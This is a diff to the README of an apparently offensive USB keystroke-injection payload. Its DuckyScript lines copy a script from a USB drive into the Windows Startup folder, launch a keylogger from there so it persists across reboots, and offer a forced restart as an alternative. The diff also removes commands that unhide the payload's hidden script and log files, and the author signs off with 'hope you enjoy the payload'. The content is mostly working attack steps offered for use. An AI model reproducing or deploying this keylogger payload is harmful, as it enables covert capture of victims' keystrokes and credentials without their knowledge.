@@ -49,11 +49,11 @@ STRING $u=gwmi Win32_Volume|?{$_.Label -eq'L'}|select name;cd $u.name;cp .\c.cmd
 ```
 REM comment out the option you decide NOT to use
 
-REM STAGE 5 [OPTION1]
+REM STAGE 4 [OPTION1]
 REM run keylogger
-STRING .\c.cmd;exit
+STRING cd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";.\c.cmd;exit
 
-REM STAGE 5 [OPTION2]
+REM STAGE 4 [OPTION2]
 REM restart computer
 STRING shutdown /r
 ```
@@ -70,14 +70,6 @@ this means an attacker could place a
 be downloaded from anywhere on the internet onto the computer.
 the file would then save in the startup directory,
 allowing it to run every startup
-```
----
-Show Files via powershell
-```
-TEMP:
-    attrib -h -s -r l.ps1;attrib -h -s -r "$env:UserName.log"
-STARTUP:
-    attrib -h -s -r c.cmd
 ```
 ---
 - hope you enjoy the payload!!
